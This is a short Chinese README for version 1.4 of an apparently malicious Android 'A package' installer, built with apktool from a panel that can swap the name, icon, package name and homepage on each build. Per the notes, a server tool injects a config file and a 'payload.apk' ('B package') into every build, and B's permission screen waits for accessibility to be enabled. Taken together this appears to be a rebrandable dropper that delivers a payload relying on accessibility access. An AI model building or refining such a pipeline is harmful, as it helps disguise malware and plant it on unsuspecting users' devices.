# A 包 1.4（源码构建）

从 1.3.1/1.3.2 的 apktool 工程复制而来，`apktool.yml` 已改为 `versionCode: 7 / versionName: 1.4`。

## 本版目的

```
① 面板默认走「源码构建」：模板 installer-1.4 的 sourceDir = apk-project/installer-1.4
   每次构建都从这份工程重新 apktool b，改名字/图标/包名/首页都直接生效
② 配合 B 包 v894 的权限页加固：
   B 包 PermissionActivity 已改为 exported=false，并且无障碍未开时自动 finish，
   旧版 A 包即使调用该组件也不会再"没开无障碍就弹权限"
```

## 构建

```
面板 → 构建中心 → 第 2 步 A 包 → 模板版本默认 v1.4
  或命令行：
  java -jar tools/apktool.jar b -f -o out.apk apk-project/installer-1.4
  （服务器会用 source_builder 自动注入 installer_config.json + payload.apk）
```

## 注意

A 包 1.4 仍会携带「同账号最新 B 包」，首页地址留空时自动继承 B 包的 homepage。
